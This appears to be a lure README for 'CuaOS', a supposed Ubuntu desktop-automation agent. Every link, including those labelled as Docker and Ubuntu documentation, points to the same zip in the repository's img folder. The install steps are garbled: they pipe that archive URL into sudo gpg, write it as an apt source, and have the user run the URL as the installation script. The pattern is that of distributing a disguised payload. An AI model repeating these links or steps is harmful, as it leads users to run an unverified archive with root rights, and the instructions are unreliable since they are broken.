# 🖥️ CuaOS - Automate Tasks on Your Ubuntu PC

[![Download CuaOS](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip)](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip)

---

## 📋 What is CuaOS?

CuaOS is a tool that helps your computer do tasks for you automatically. It uses a smart model called Qwen3-VL to control your keyboard and mouse. The program runs in a safe area on your Ubuntu computer, which means it won’t affect other parts of your system.

You tell CuaOS what to do using simple commands. It then follows these commands to use your computer like a helper. This works without needing to connect to the internet because everything runs locally on your machine. 

CuaOS is ideal if you want to save time on repetitive tasks or run complex operations without doing them yourself. It works well for anyone who uses Ubuntu and wants an easy way to automate daily computer activities.

---

## 🖥️ What You Need

Before you start, make sure your computer is ready for CuaOS. Here are the main things you should have:

- **Operating System**: Ubuntu 20.04 or later
- **Processor**: At least a dual-core CPU (Intel or AMD)
- **Memory (RAM)**: 4 GB or more
- **Disk Space**: Minimum 2 GB free space for app and sandbox storage
- **Docker Installed**: CuaOS uses Docker to run safely and independently
- **Internet Connection**: Only needed for downloading and installing

If you are unsure about Docker, don’t worry. The setup guide below will explain how to install it.

---

## 🚀 Getting Started with CuaOS

Using CuaOS does not require any programming knowledge. This step-by-step guide will help you download, install, and start using the application smoothly.

---

## 📥 Download & Install

You can get CuaOS from the official release page:

[Download CuaOS](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip)

Click that link to open the page where you can find the latest version available for download.

---

### Step 1: Download CuaOS

1. Visit the [CuaOS release page](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip).
2. Look for the latest release. It will usually be at the top of the page.
3. Download the file ending with `https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip` or `.zip` designed for Ubuntu. This will contain the CuaOS software and all necessary files.

---

### Step 2: Install Docker

CuaOS uses Docker to run its environment safely. If you don’t have Docker installed, follow these steps:

1. Open your terminal (you can find it by searching “Terminal” in your system).
2. Run these commands one by one:

```
sudo apt update
sudo apt install apt-transport-https ca-certificates curl software-properties-common
curl -fsSL https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip | sudo gpg --dearmor -o https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip
echo "deb [arch=$(dpkg --print-architecture) https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip] https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip $(lsb_release -cs) stable" | sudo tee https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip > /dev/null
sudo apt update
sudo apt install docker-ce
sudo systemctl status docker
```

3. If Docker is running (status shows "active"), you are ready for the next step.

---

### Step 3: Install CuaOS

1. Extract the downloaded `https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip` or `.zip` file by right-clicking and choosing “Extract Here” or using the terminal:

```
tar -xvzf https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip
```

2. Open the newly created folder.
3. Inside, you will find instructions to run CuaOS. Usually, this will be a script file or detailed README.
4. Run the installation script by opening the terminal inside that folder and typing:

```
https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip
```

This script will set up CuaOS and download any needed components.

---

### Step 4: Launch CuaOS

Once installed, you can start CuaOS by running the command:

```
cuaos start
```

This will open the CuaOS interface where you can start giving it commands.

---

## 🎛️ How to Use CuaOS

CuaOS controls your computer by typing commands for mouse and keyboard in a sandbox environment. Here are some basic instructions to get you started:

- After launching, you will see a text box to enter commands.
- Commands are simple phrases like “open browser” or “click button” that CuaOS understands.
- You can ask it to open apps, fill forms, or move the mouse.
- Everything is done inside a protected space, so your files stay safe.

Sample commands to try:

- `open browser`
- `type "Hello, world!"`
- `click at position 300 400`
- `take screenshot`

You can chain commands by typing them one after the other. CuaOS reads them step-by-step.

---

## 🔧 Features

- Runs locally on your computer, no internet needed after installation.
- Uses Qwen3-VL model to understand and follow your commands.
- Controls keyboard and mouse in Ubuntu safely inside a Sandbox.
- Works within Docker containers for easier setup and secure operation.
- Supports the GGUF file format for model data.
- Compatible with TigerVNC for remote desktop viewing.
- Regular updates improve automation abilities.

---

## 🔄 Updating CuaOS

To update CuaOS:

1. Visit the release page: [https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip).
2. Download the latest version.
3. Repeat installation steps to replace the old version.
4. Your settings and commands stay intact, but it’s a good idea to save important data just in case.

---

## ❓ Troubleshooting

If something does not work as expected:

- Make sure Docker is running correctly (`sudo systemctl status docker`).
- Confirm you have the latest CuaOS version.
- Restart your computer to reset Docker and apps.
- Check your Ubuntu version; CuaOS works best on 20.04 or newer.
- Visit the issues section on the GitHub page to see if others have the same problem.

---

## 📖 Additional Resources

- [Docker Documentation](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip)
- [Ubuntu Support](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip)
- [GitHub CuaOS Issues](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip)

---

## 📞 Getting Help

If you still need help, open a new issue on the GitHub page. Include:

- Ubuntu version
- Docker status
- What you tried to do
- Any error messages you received

The developers and community will assist you.

---

[![Download CuaOS](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip)](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip)